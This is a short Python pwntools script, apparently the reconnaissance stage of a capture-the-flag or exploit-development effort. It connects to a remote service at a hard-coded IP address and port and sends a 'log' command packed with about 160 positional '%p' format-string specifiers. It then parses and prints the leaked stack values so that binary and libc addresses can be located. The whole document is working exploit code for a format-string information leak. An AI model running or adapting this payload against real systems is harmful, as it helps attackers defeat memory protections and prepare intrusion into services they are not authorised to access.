from pwn import *
import re
context.arch='amd64'
HOST,PORT='52.76.96.108',9008
r=remote(HOST,PORT)
r.recvuntil(b"> ",timeout=5)
# Use newline separator; arg7.. up to deep stack to find binary addresses & libc ret
parts=[b"%%%d$p"%i for i in range(1,160)]
payload=b"log "+b"|".join(parts)
r.sendline(payload)
data=r.recvuntil(b"> ",timeout=6)
m=re.search(rb'\[INFO\]\s(.*)\n', data, re.S)
vals = re.split(rb'\|', m.group(1))
for i,v in enumerate(vals,1):
    vv=v.strip()
    if vv and vv!=b'(nil)':
        print(i, vv.decode(errors='replace'))
r.close()
